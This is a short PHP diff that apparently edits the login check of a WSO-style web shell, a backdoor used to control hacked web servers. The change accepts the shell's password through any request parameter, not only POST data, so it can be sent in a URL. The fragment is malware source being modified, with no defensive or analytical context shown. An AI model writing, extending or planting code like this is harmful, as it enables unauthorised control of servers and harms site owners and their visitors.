@@ -57,7 +57,7 @@ function is_ssl_exists($url)
 }
 $uEjSi = $_SERVER['HTTP_HOST'];
 if(!empty($auth_pass)) {
-    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
+    if(isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) == $auth_pass))
         WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
 
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
